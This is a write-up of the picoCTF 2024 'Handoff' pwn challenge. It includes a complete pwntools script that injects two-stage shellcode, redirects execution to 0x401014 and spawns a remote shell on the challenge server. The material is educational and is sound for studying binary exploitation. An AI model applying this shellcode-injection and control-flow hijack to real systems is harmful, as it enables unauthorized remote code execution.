# Handoff - PicoCTF 2024

## Challenge Information

- **Category**: Pwn
    
- **Points**: 400
    
- **Author**: SkrubLawd
    
- **Description**:
    
    - Download the binary: handoff
        
    - Download the source: source
        
    - Connect to the server:
        
        ```
        nc shape-facility.picoctf.net 62192
        ```
        

---

## Analysis

The challenge provides a binary named `handoff`. Since we are dealing with a Pwn challenge, we begin by analyzing the binary using tools like `checksec`, `file`, and `strings` to gather basic information.

```
checksec --file=handoff
```

This will tell us whether the binary has mitigations like **PIE, NX, Canary, RELRO**, etc.

Running `strings` might help identify interesting function calls.

To understand the program flow, we can decompile it using Ghidra or IDA Pro. Using `gdb` or `pwndbg`, we can debug and analyze how user input is processed.

---

## Exploitation Strategy

### Observations:

1. The program allows sending input in different stages.
    
2. It does not properly handle input, allowing for shellcode injection.
    
3. We can leverage this to execute arbitrary code by controlling the instruction pointer.
    

### Plan:

1. Send an initial shellcode payload to perform basic setup.
    
2. Inject secondary shellcode to redirect execution flow to our shell payload.
    
3. Gain a shell by executing `execve("/bin/sh")`.
    

---

## Exploit Code

We use `pwntools` to interact with the remote service and craft our payload.

```
from pwn import *

# Set up the binary and context
elf = context.binary = ELF('./handoff')

# Connect to the remote server
p = remote('shape-facility.picoctf.net', 62192)

# Define the first stage shellcode
shellcode = asm('''
    xor rsi, rsi
    push 0
    pop rax
    xor rdi, rdi
    mov rsi, rsp
    push 0x64
    pop rdx
    syscall
    jmp rsp
''')

# Define the second stage shellcode
newshellcode = asm('''
    sub rax, 716
    jmp rax
    jmp rax
''')

# Interact with the program
p.sendlineafter(b'app', b'1')
p.sendlineafter(b'name:', b'name')

p.sendlineafter(b'app', b'2')
p.sendlineafter(b'to?', b'0')
p.sendlineafter(b'them?', shellcode)

# Prepare the payload
payload = newshellcode
payload += asm('nop') * (20 - len(payload))
payload += p64(0x401014)  # Address to redirect execution

# Send the payload
p.sendlineafter(b'app', b'3')
p.sendlineafter(b'it:', payload)

# Send the final shellcode to spawn a shell
p.sendline(asm(shellcraft.sh()))

# Switch to interactive mode
p.interactive()
```

---

## Execution & Shell Access

1. Run the exploit script:
    
    ```
    python3 exploit.py
    ```
    
2. If successful, we gain a shell and can read the flag with:
    
    ```
    cat flag.txt
    ```
    

---

## Conclusion

This challenge required a two-stage shellcode execution technique to hijack execution flow and gain control over the program. By crafting shellcode carefully and leveraging memory manipulation, we were able to bypass security mechanisms and achieve remote code execution.